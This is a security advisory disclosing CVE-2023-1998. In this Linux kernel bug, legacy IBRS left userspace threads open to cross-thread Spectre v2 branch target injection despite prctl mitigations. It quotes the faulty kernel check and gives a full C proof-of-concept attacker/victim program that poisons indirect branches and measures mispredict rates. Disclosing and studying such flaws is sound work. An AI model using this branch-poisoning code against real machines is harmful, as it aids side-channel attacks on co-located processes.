---
title: 'Linux Kernel: Spectre v2 SMT mitigations problem'
severity: Moderate
ghsa_id: GHSA-mj4w-6495-6crx
cve_id: CVE-2023-1998
weaknesses: []
products:
- ecosystem: Linux
  package_name: Kernel
  affected_versions: <6.3
  patched_versions: '6.3'
cvss: null
credits:
- github_user_id: rrbranco
  name: Rodrigo Rubira Branco (BSDaemon)
  avatar: https://avatars.githubusercontent.com/u/610945?s=40&v=4
- github_user_id: sinkap
  name: KP Singh
  avatar: https://avatars.githubusercontent.com/u/2152812?s=40&v=4
- github_user_id: es0j
  name: José Luiz
  avatar: https://avatars.githubusercontent.com/u/37257235?s=40&v=4
---

### Summary
The Linux kernel allows userspace processes to enable mitigations by calling prctl with PR_SET_SPECULATION_CTRL which disables the speculation feature as well as by using seccomp. We had noticed that on VMs of at least one major cloud provider, the kernel still left the victim process exposed to attacks in some cases even after enabling the spectre-BTI mitigation with prctl. The same beahaviour can be observed on a bare-metal machine when forcing the mitigation to IBRS on boot comand line.

This happened because when plain IBRS was enabled (not enhanced IBRS), the kernel had some logic that determined that STIBP was not needed. The IBRS bit implicitly protects against cross-thread branch target injection. However, with legacy IBRS, the IBRS bit was cleared on returning to userspace, due to performance reasons, which disabled the implicit STIBP and left userspace threads vulnerable to cross-thread branch target injection against which STIBP protects.

### Severity
Medium - The kernel failed to protect applications that attempted to protect against Spectre v2 leaving them open to attack from other processes running on the same physical core in another hyperthread.

### Vulnerable code

The Bug present on Kernel 6.2 (https://elixir.bootlin.com/linux/v6.2/source/arch/x86/kernel/cpu/bugs.c#L1196) implements an optimization that disables STIBP if the mitgation is IBRS or eIBRS. However IBRS doesn't mitigate SMT attacks on userspace as eIBRS does. Setting spectre_v2=ibrs on kernel boot parameters for bare metal machines without eIBRS support also triggers the bug.

```.c
        /*
         * If no STIBP, IBRS or enhanced IBRS is enabled, or SMT impossible,
         * STIBP is not required.
         */
        if (!boot_cpu_has(X86_FEATURE_STIBP) ||
            !smt_possible ||
            spectre_v2_in_ibrs_mode(spectre_v2_enabled))
                return;
```


### Proof of Concept
The test consists of two processes. The attacker constantly poisons an indirect call to speculatively redirect it to a target address. The victim process measures the mispredict rate and tries to mitigate the attack either by calling PRCTL or writing to the MSR directly using a kernel module that exposes MSR read and write operations to userspace.

```.c
/*
gcc -o victim test.c -O0 -masm=intel -w                 -DVICTIM
gcc -o victim-PRCTL test.c -O0 -masm=intel -w   -DVICTIM  -DPRCTL
gcc -o victim-nospecctrl test.c -O0 -masm=intel -w      -DVICTIM  -DMSR  -DMSR_VAL=0
gcc -o victim-IBRS test.c -O0 -masm=intel -w    -DVICTIM  -DMSR  -DMSR_VAL=1
gcc -o victim-STIBP test.c -O0 -masm=intel -w   -DVICTIM  -DMSR  -DMSR_VAL=2
gcc -o victim-IBPB test.c -O0 -masm=intel -w    -DVICTIM  -DMSR  -DMSR_VAL=0 -DIBPB
gcc -o attacker test.c -O0 -masm=intel -w
*/
#include "utils.h"
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>

#ifndef PRINT_AMMOUNT
#define PRINT_AMMOUNT 1000
#endif

#define IA32_SPEC_CTRL 72

uint8_t *rdiPtr;
uint8_t unused[0x500];
uint8_t probeArray[0x1000] = {2};
uint8_t unuse2[0x500];

uint32_t f1() {}

int poison(uint8_t *srcAddress, uint8_t *dstAddress, uint64_t cpu)
{
    volatile uint8_t d;

    unsigned tries = 0;
    unsigned hits = 0;
    unsigned totalHits = 0;
    unsigned totalTries = 0;

    jitForLoop(srcAddress);

    while (1)
    {

#ifndef VICTIM
        callGadget(srcAddress, (uint8_t *)&rdiPtr, (uint8_t *)probeArray);
        continue;
#else

#ifdef IBPB
        wrmsr_on_cpu(73, cpu, 1);
#endif
        for (int i = 0; i < 100; i++)
        {
            d = *dstAddress;
            flush((uint8_t *)&rdiPtr);
            callGadget(srcAddress, (uint8_t *)&rdiPtr, (uint8_t *)probeArray);
        }

        if (probe(&probeArray[0]) < THRESHOLD)
        {
            hits++;
            totalHits++;
        }

        totalTries++;
        if (++tries % PRINT_AMMOUNT == 0)
        {

            printf("Rate: %u/%u  MSR[72]=%d\n", hits, tries,rdmsr_on_cpu(IA32_SPEC_CTRL,cpu));
            #ifdef MSR
            wrmsr_on_cpu(IA32_SPEC_CTRL, cpu, MSR_VAL);
            #endif
            tries = 0;
            hits = 0;
            if (totalTries >= PRINT_AMMOUNT * 10)
            {
                break;
            }
        }
        usleep(1);

#endif
    }

    printf("Total mispredict rate: %d/%d (%.2f %)\n", totalHits, totalTries, (float)totalHits * 100 / (float)totalTries);
}

int main(int argc, char **argv)
{

    uint64_t srcAddress;
    uint64_t dstAddress;
    uint64_t cpu;

    if (argc < 4)
    {
        printf("Usage:   %s <srcAddress> <dstAddress> <cpuCore> \n", argv[0]);
        printf("Example: %s 0x55555554123 0x55555555345 1 \n", argv[0]);
        return 0;
    }

    srcAddress = (uint64_t)strtoull(argv[1], NULL, 16);
    dstAddress = (uint64_t)strtoull(argv[2], NULL, 16);
    cpu = (uint64_t)strtoull(argv[3], NULL, 16);
    SetCoreAffinity(cpu);

    uint8_t *rwx1 = requestMem((uint8_t *)(srcAddress & (~0xfffULL)), 0x1000);
    uint8_t *rwx2 = requestMem((uint8_t *)(dstAddress & (~0xfffULL)), 0x1000);

#ifdef PRCTL
    if (prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_FORCE_DISABLE, 0, 0) != 0)
    {
        perror("prctl");
    }
    printf("PRCTL GET value 0x%x\n", prctl(PR_GET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, 0, 0, 0));
#endif

#ifdef MSR
    printf("current value msr[%d]=%d on core %d\n", IA32_SPEC_CTRL, rdmsr_on_cpu(IA32_SPEC_CTRL, cpu), cpu);
    wrmsr_on_cpu(IA32_SPEC_CTRL, cpu, MSR_VAL);
    printf("writing msr[%d]=%d on core %d \n", IA32_SPEC_CTRL, MSR_VAL, cpu);
    printf("current value msr[%d]=%d on core %d\n", IA32_SPEC_CTRL, rdmsr_on_cpu(IA32_SPEC_CTRL, cpu), cpu);
#endif

// set up leak gadget into position
#ifdef VICTIM
    rdiPtr = (uint8_t *)f1;
    copyLeakGadget(dstAddress);
#else
    rdiPtr = (uint8_t *)dstAddress;
    copyRetGadget(dstAddress);
#endif

    poison(srcAddress, dstAddress, cpu);

#ifdef MSR
    printf("current value msr[%d]=%d on core %d\n", IA32_SPEC_CTRL, rdmsr_on_cpu(IA32_SPEC_CTRL, cpu), cpu);
#endif
}
```


### Timeline
**Date reported** to Cloud providers: 31/12/2022
**Date reported** to security@kernel.org: 20/02/2022
**Date fixed**: 10/03/2023  
 -  https://github.com/torvalds/linux/commit/6921ed9049bc7457f66c1596c5b78aec0dae4a9d
 - https://kernel.dance/#6921ed9049bc7457f66c1596c5b78aec0dae4a9d

**Date disclosed**: 12/04/2023